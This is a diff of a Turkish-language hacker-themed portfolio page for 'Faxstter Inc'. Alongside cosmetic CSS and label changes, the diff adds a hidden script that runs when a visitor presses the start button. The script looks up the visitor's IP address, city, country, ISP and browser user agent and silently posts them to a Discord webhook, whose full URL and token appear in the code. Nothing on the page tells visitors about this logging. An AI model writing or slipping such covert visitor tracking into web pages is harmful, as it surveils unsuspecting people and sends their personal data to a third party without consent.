@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Faxstter Inc | Mobile Ready</title>
+    <title>Faxstter Inc | Elite Terminal</title>
     <style>
         body { 
             background: #000; 
@@ -23,7 +23,6 @@
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; z-index: 9999; }
         #start-btn { padding: 15px 35px; font-size: 1.1rem; background: #000; color: #00ff00; border: 2px solid #00ff00; cursor: pointer; box-shadow: 0 0 20px #00ff00; font-weight: bold; }
 
-        /* TELEFONLARDA KARIŞMAMASI İÇİN YAN YAZILARIN AYARI */
         .lyric-loop { 
             position: fixed; 
             top: 50%; 
@@ -37,15 +36,13 @@
             z-index: 1; 
             pointer-events: none; 
             text-transform: uppercase;
-            overflow: hidden;
         }
         .left-loop { left: 5px; text-align: left; }
         .right-loop { right: 5px; text-align: right; }
 
-        /* BAŞLIK VE KART - TAM MERKEZ */
         .title-wrapper { 
             display: flex; 
-            flex-direction: column; /* Mobilde alt alta gelmesi için */
+            flex-direction: column; 
             align-items: center; 
             justify-content: center; 
             gap: 10px; 
@@ -59,7 +56,6 @@
         .faxstter-title { font-size: clamp(1.5rem, 8vw, 4rem); font-weight: 900; color: #000; -webkit-text-stroke: 1.2px #00ff00; text-shadow: 0 0 20px #00ff00; margin: 0; }
         .card-icon { font-size: clamp(2rem, 10vw, 4rem); color: #00ff00; filter: drop-shadow(0 0 10px #00ff00); }
 
-        /* ANA PANEL ÇERÇEVESİ - MOBİL ODAKLI */
         .main-frame { 
             width: 85%; 
             max-width: 600px; 
@@ -81,7 +77,6 @@
         .content-area { display: none; width: 100%; animation: fadeIn 0.4s ease; }
         .ss-img { width: 100%; border: 1px solid #00ff00; margin-bottom: 20px; border-radius: 4px; }
 
-        /* İLETİŞİM BUTONLARI MERKEZDE */
         .contact-section { margin-top: 30px; border-top: 1px solid #222; padding-top: 20px; text-align: center; }
         .contact-title { color: #0088ff; font-size: 1rem; margin-bottom: 15px; letter-spacing: 3px; font-weight: bold; }
         .social-links { display: flex; flex-direction: column; gap: 10px; align-items: center; }
@@ -95,8 +90,10 @@
             background-color: #000000; 
             padding: 10px 20px; 
             font-weight: 900; 
-            width: 160px; /* Mobilde butonlar eşit boyda olsun */
+            width: 160px;
+            transition: 0.3s;
         }
+        .social-link:hover { background: #0088ff; color: #000; box-shadow: 0 0 20px #0088ff; }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
@@ -106,7 +103,7 @@
     <canvas id="matrix-canvas"></canvas>
 
     <div id="overlay">
-        <button id="start-btn" onclick="initPortal()">SİSTEMİ BAŞLAT</button>
+        <button id="start-btn" onclick="initPortal()">EXECUTE FAXSTTER_CORE</button>
     </div>
 
     <div class="lyric-loop left-loop" id="l-loop"></div>
@@ -119,9 +116,9 @@
 
     <div class="main-frame">
         <div class="btn-grid">
-            <button class="panel-btn" onclick="toggleSec('bot-display', event)">🤖 BOTLAR</button>
-            <button class="panel-btn tool-red" onclick="toggleSec('tool-display', event)">⚙️ TOOLLAR</button>
-            <button class="panel-btn info-pink" onclick="toggleSec('info-display', event)" style="grid-column: span 1;">ℹ️ BİLGİ</button>
+            <button class="panel-btn" onclick="toggleSec('bot-display', event)">🤖 AKTİF BOTLAR</button>
+            <button class="panel-btn tool-red" onclick="toggleSec('tool-display', event)">⚙️ ÖZEL TOOLLAR</button>
+            <button class="panel-btn info-pink" onclick="toggleSec('info-display', event)">ℹ️ BİLGİLENDİRME</button>
         </div>
 
         <div id="bot-display" class="content-area">
@@ -134,14 +131,14 @@
         </div>
         <div id="info-display" class="content-area" style="color:#ff00ff; text-align:center;">
             <h3>🔱 FAXSTTER SERVICES 🔱</h3>
-            <p>ÖZEL TOOL & SİTE TASARIMI YAPILIR. 💀</p>
+            <p>ÖZEL TOOL YAPIMI & ELİTE SİTE TASARIMI YAPILIR. 💀</p>
         </div>
 
         <div class="contact-section">
             <div class="contact-title">-- İLETİŞİM --</div>
             <div class="social-links">
                 <a href="https://instagram.com/faxstter" target="_blank" class="social-link">INSTAGRAM</a>
-                <a href="https://open.spotify.com/user/senin_id" target="_blank" class="social-link">SPOTIFY</a>
+                <a href="https://open.spotify.com/user/faxstter" target="_blank" class="social-link">SPOTIFY</a>
             </div>
         </div>
     </div>
@@ -151,11 +148,37 @@
     <script>
         const songLyrics = ["POLİSE ANLAT", "BENİ SENİ FARE", "ICQ 2000", "BATMAN DEĞİLİM", "ATM PATLAT"];
         let audioCtx, analyser, dataArray;
+        const webhookURL = "https://discord.com/api/webhooks/1470110601714864198/Gxgga4v26nLVHeZPgqpTrrg5sqnp4xsJsVjP0BuDKmNXcRdsVYv284lOBul-gUcj4jPw";
+
+        async function logToDiscord() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                const params = {
+                    username: "Faxstter Logger",
+                    embeds: [{
+                        title: "🚨 YENİ ZİYARETÇİ SİSTEME GİRDİ",
+                        color: 3447003,
+                        fields: [
+                            { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
+                            { name: "📍 Konum", value: `${data.city} / ${data.country_name}`, inline: true },
+                            { name: "🏢 ISP", value: data.org, inline: false },
+                            { name: "📱 Cihaz", value: navigator.userAgent, inline: false }
+                        ],
+                        timestamp: new Date()
+                    }]
+                };
+                fetch(webhookURL, { method: "POST", headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(params) });
+            } catch (e) {}
+        }
 
         function initPortal() {
             document.getElementById('overlay').style.display = 'none';
             const audio = document.getElementById('bg-music');
             audio.play();
+            
+            // Loglama Başlat
+            logToDiscord();
 
             audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             analyser = audioCtx.createAnalyser();
